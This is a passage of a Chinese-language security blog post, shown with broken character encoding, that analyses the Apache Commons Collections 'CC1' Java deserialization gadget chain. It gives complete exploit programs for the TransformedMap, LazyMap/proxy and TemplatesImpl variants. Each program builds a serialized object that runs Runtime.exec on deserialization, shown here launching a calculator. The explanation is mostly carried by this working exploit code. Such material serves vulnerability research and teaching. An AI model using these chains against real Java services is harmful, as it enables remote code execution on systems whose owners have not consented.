å…¥å€¼ä¸æ˜¯Runtime.class"></a><strong>ä¸‰ã€checkSetValueä¼ å…¥å€¼ä¸æ˜¯Runtime.class</strong></h3><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106130111612.png" class="" title="This is an example image"><p>æˆ‘ä»¬å¯ä»¥å‘ç°readObjectæ–¹æ³•ä¸­setValueä¼ å…¥çš„å‚æ•°å¹¶ä¸æ˜¯Runtime.classï¼Œè€Œæ˜¯ä¸€ä¸ªå¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ã€‚</p><ul><li>æˆ‘ä»¬è¿™é‡Œæ‰¾åˆ°äº†ä¸€ä¸ªèƒ½å¤Ÿè§£å†³ <code>setValue</code> å¯æ§å‚æ•°çš„ç±» â€”â€”â€”â€” <code>ConstantTransformer</code>ã€‚</li></ul><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106154143060.png" class="" title="This is an example image"><p>æˆ‘ä»¬çœ‹åˆ°è¿™ä¸ªç±»é‡Œé¢ä¹Ÿæœ‰transformï¼Œå’Œæ„é€ å™¨é…åˆä½¿ç”¨çš„è¯ï¼Œæˆ‘ä»¬ä¼ å…¥ä»€ä¹ˆå€¼ï¼Œå°±ä¼šè¿”å›æŸä¸ªå€¼ï¼Œè¿™æ ·å°±èƒ½å°†valueçš„å€¼è½¬ä¸º<strong>Runtime.class</strong></p><p>å› æ­¤æ¥ä¸‹æ¥ç»™å‡ºæˆ‘ä»¬çš„æœ€ç»ˆEXP:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class rr=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//åˆ›å»ºä¸€ä¸ªTransformeræ•°å€¼ç”¨äºå‚¨å­˜InvokerTransformerçš„æ•°æ®ï¼Œä¾¿äºéå†</span></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//è¿™é‡Œè§£å†³é—®é¢˜ä¸‰</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedtransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//ä¸Šè¿°åˆ©ç”¨åå°„è·å–ç±»åŸå‹+transformeræ•°ç»„ï¼‹chainedtransformeréå†å®ç°transformæ–¹æ³•ï¼Œæ¥è§£å†³é—®é¢˜ä¸€ä¸­çš„æ— æ³•åºåˆ—åŒ–é—®é¢˜ã€‚</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);<span class="comment">//è¿™é‡Œæ˜¯é—®é¢˜äºŒä¸­æ”¹é”®å€¼å¯¹çš„å€¼ä¸ºæ³¨è§£ä¸­æˆå‘˜å˜é‡çš„åç§°ï¼Œé€šè¿‡ifåˆ¤æ–­</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,chainedtransformer);</span><br><span class="line">        Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object o=constructor.newInstance(Target.class,transformedmap);<span class="comment">//è¿™é‡Œæ˜¯é—®é¢˜äºŒä¸­ç¬¬ä¸€ä¸ªå‚æ•°æ”¹æ³¨è§£ä¸ºTarget</span></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106164613205.png" class="" title="This is an example image"><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ã€‚</p><p>æ¥ä¸‹æ¥å™è¿°ä¸€ä¸‹æ•´æ¡cc1é“¾çš„æµç¨‹</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241106170506128.png" class="" title="This is an example image"><h1 id="æ­£ç‰ˆCC1é“¾åˆ†æ-lazyMap"><a href="#æ­£ç‰ˆCC1é“¾åˆ†æ-lazyMap" class="headerlink" title="æ­£ç‰ˆCC1é“¾åˆ†æ-lazyMap"></a>æ­£ç‰ˆCC1é“¾åˆ†æ-lazyMap</h1><h2 id="ç»ˆç‚¹-åˆ©ç”¨ç‚¹-execæ–¹æ³•"><a href="#ç»ˆç‚¹-åˆ©ç”¨ç‚¹-execæ–¹æ³•" class="headerlink" title="ç»ˆç‚¹-åˆ©ç”¨ç‚¹-execæ–¹æ³•"></a>ç»ˆç‚¹-åˆ©ç”¨ç‚¹-execæ–¹æ³•</h2><p>æ¼æ´ç‚¹ä¸ä¸Šé¢ä¸€æ ·ï¼Œè¿˜æ˜¯InvokerTransformer</p><p>åœ¨InvokerTransformer#transformä¸‹å¯»æ‰¾ç”¨æ³•</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110195928983.png" class="" title="This is an example image"><p>LazyMapçš„getæ–¹æ³•è°ƒç”¨äº†transformæ–¹æ³•ä¸”getæ–¹æ³•çš„ä½œç”¨åŸŸä¸ºpublic</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110200016287.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">factory.transform</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬çœ‹çœ‹factoryæ˜¯ä»€ä¹ˆ</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110200355043.png" class="" title="This is an example image"><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110200409626.png" class="" title="This is an example image"><p>å¯ä»¥çŸ¥é“factoryæ˜¯LazyMapæ„é€ å™¨çš„å‚æ•°ï¼ŒåŒæ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡decorateæ¥newä¸€ä¸ªLazyMapå¯¹è±¡ï¼Œfactoryæ˜¯å¯ä»¥ç”±æˆ‘ä»¬è‡ªå·±å†³å®šçš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1_lazymap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime runtime=Runtime.getRuntime();</span><br><span class="line">        InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map decoratemap=LazyMap.decorate(hashmap,invokerTransformer);</span><br><span class="line">        Class&lt;LazyMap&gt; lazymapclass=LazyMap.class;</span><br><span class="line">        Method lazygetmethod=lazymapclass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>,Object.class);</span><br><span class="line">        lazygetmethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        lazygetmethod.invoke(decoratemap,runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110205053416.png" class="" title="This is an example image"><ul><li>ç›®å‰è¯æ˜è¿™æ¡é“¾æ˜¯å¯è¡Œçš„ï¼Œæˆ‘ä»¬ç»§ç»­å¾€ä¸Šèµ°ï¼Œæœ€ç»ˆç›®æ ‡æ˜¯æ‰¾åˆ°å…¥å£ç±»çš„ <code>readObject</code> æ–¹æ³•ã€‚</li></ul><p>ç„¶åæˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯æ‰¾è°è°ƒç”¨äº†getæ–¹æ³•</p><p>æœ€ç»ˆåœ¨ <code>AnnotationInvocationHandler.invoke()</code> æ–¹æ³•ä¸­æ‰¾åˆ°äº†æœ‰ä¸€ä¸ªåœ°æ–¹è°ƒç”¨äº† <code>get()</code> æ–¹æ³•ã€‚</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110205729222.png" class="" title="This is an example image"><p>è¿™é‡Œå…¶å®å¯ä»¥ç±»æ¯”æˆè®©memberValuesä¸ºLazyMapå³å¯ã€‚</p><p>åŒæ—¶è¿™ä¸ªç±»ä¹Ÿéå¸¸å¥½ï¼Œå®ƒé‡Œé¢æœ‰ <code>readObject()</code> æ–¹æ³•ï¼Œå¯ä»¥ä½œä¸ºæˆ‘ä»¬çš„å…¥å£ç±»ã€‚</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬è¦å…³æ³¨çš„å°±æ˜¯å¦‚ä½•è§¦å‘invoke()æ–¹æ³•</p><p>éœ€è¦è§¦å‘ <code>invoke</code> æ–¹æ³•ï¼Œé©¬ä¸Šæƒ³åˆ°åŠ¨æ€ä»£ç†ï¼Œä¸€ä¸ªç±»è¢«åŠ¨æ€ä»£ç†äº†ä¹‹åï¼Œæƒ³è¦é€šè¿‡ä»£ç†è°ƒç”¨è¿™ä¸ªç±»çš„æ–¹æ³•ï¼Œå°±ä¸€å®šä¼šè°ƒç”¨ <code>invoke()</code> æ–¹æ³•ã€‚æˆ‘ä»¬å»æ‰¾ä¸€æ‰¾èƒ½åˆ©ç”¨çš„åœ°æ–¹</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110210202367.png" class="" title="This is an example image"><p>åœ¨è¿™é‡Œè°ƒç”¨äº† <code>entrySet()</code> æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬å°† <code>memberValues</code> çš„å€¼æ”¹ä¸ºä»£ç†å¯¹è±¡ï¼Œå½“è°ƒç”¨ä»£ç†å¯¹è±¡çš„æ–¹æ³•ï¼Œé‚£ä¹ˆå°±ä¼šè·³åˆ°æ‰§è¡Œ <code>invoke()</code> æ–¹æ³•ï¼Œæœ€ç»ˆå®Œæˆæ•´æ¡é“¾å­çš„è°ƒç”¨ã€‚membervaluesæ˜¯æ„é€ å™¨éœ€è¦ä¼ å…¥çš„å‚æ•°ã€‚</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110210307500.png" class="" title="This is an example image"><p>é‚£ä¹ˆè¿™é‡Œå°±æ˜¯è¦å…ˆè®©membervaluesä¸ºlazymapå†è®¾ç½®åŠ¨æ€ä»£ç†ã€‚</p><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">lazymap_zong</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt;hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map decorateMap= LazyMap.decorate(hashmap,chainedTransformer);</span><br><span class="line">        Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler annotationinvocationhandler=(InvocationHandler) constructor.newInstance(Override.class,decorateMap);</span><br><span class="line">        Map proxymap=(Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,annotationinvocationhandler);</span><br><span class="line">        annotationinvocationhandler=(InvocationHandler)constructor.newInstance(Override.class,proxymap);</span><br><span class="line">        serialize(annotationinvocationhandler);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span><span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;ser.bin&quot;</span>)));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String name)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(name)));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110214009583.png" class="" title="This is an example image"><h2 id="é“¾å­æ•´ç†"><a href="#é“¾å­æ•´ç†" class="headerlink" title="é“¾å­æ•´ç†"></a>é“¾å­æ•´ç†</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">è°ƒç”¨é“¾</span><br><span class="line">Invokertransformer#transform</span><br><span class="line">LazyMap#get</span><br><span class="line">Annotationinvocationhandler#readObject</span><br><span class="line"></span><br><span class="line">è¾…åŠ©é“¾</span><br><span class="line">ChainedTransformer</span><br><span class="line">ConstantTransformer</span><br><span class="line">HashMap</span><br><span class="line">Map(Proxy)#entrySet</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥å€Ÿç”¨åˆ«äººçš„æµç¨‹å›¾å§</p><p><img src="https://drun1baby.top/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/CC1LazyMap.png" alt="img"></p><h1 id="CC1-é“¾çš„-TemplatesImpl-çš„å®ç°æ–¹å¼"><a href="#CC1-é“¾çš„-TemplatesImpl-çš„å®ç°æ–¹å¼" class="headerlink" title="CC1 é“¾çš„ TemplatesImpl çš„å®ç°æ–¹å¼"></a>CC1 é“¾çš„ TemplatesImpl çš„å®ç°æ–¹å¼</h1><p>cc3ä¸­å¾—åˆ°çš„æ€è·¯</p><blockquote><p>TemplatesImpl åªæ˜¯å°†åŸæœ¬çš„å‘½ä»¤æ‰§è¡Œå˜æˆä»£ç æ‰§è¡Œçš„æ–¹å¼æ‰€ä»¥åœ¨ä¸è€ƒè™‘é»‘åå•çš„æƒ…å†µä¸‹ï¼Œå¦‚æœå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œåˆ™ä¸€å®šå¯ä»¥é€šè¿‡åŠ¨æ€åŠ è½½å­—èŠ‚ç è¿›è¡Œä»£ç æ‰§è¡Œã€‚</p></blockquote><ul><li>å¦‚å›¾ï¼Œé“¾å­ä¸å˜ï¼Œåªæ˜¯æœ€åçš„å‘½ä»¤æ‰§è¡Œæ–¹å¼å˜äº†ã€‚</li></ul><p><img src="https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/Diff.png" alt="img"></p><p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å…ˆå°è¯•ä¿®æ”¹å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•ï¼Œè¿™æ—¶å€™çš„é“¾å­åº”è¯¥æ˜¯ä»åå¾€å‰çš„ï¼Œä¹Ÿå°±æ˜¯ç¡®å®šäº†å‘½ä»¤æ‰§è¡Œçš„æ–¹å¼ä¹‹åï¼Œå°†ä¼ å‚è®¾ç½®ä¸ºåŠ¨æ€åŠ è½½çš„å­—èŠ‚ç ã€‚å¹¶ä¸”å‰é¢çš„é“¾å­ä¸å˜ã€‚</p><p>æš‚æ—¶çš„ EXP æ˜¯è¿™æ ·çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">templatesImpldynamicclass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class templateClass=templates.getClass();</span><br><span class="line">        Field nameField=templateClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Meteor&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecodesfield=templateClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] evil= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\code\\calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;evil&#125;;</span><br><span class="line">        bytecodesfield.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactoryfield=templateClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfield.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chainedTransformer.transform(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœ€åä¸€å¥ï¼Œä¼ å…¥ <code>chainedTransformer.transform(1)</code> æ˜¯å› ä¸ºå‰é¢æˆ‘ä»¬å®šä¹‰äº† <code>new ConstantTransformer(templates)</code>ï¼Œè¿™ä¸ªç±»æ˜¯éœ€è¦æˆ‘ä»¬ä¼ å‚çš„ï¼Œä¼ å…¥ 1 å³å¯ã€‚</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241130145213179.png" class="" title="This is an example image"><ul><li>OKï¼Œå¼¹è®¡ç®—å™¨æˆåŠŸï¼Œæ¥ä¸‹æ¥æ˜¯æŠŠ CC1 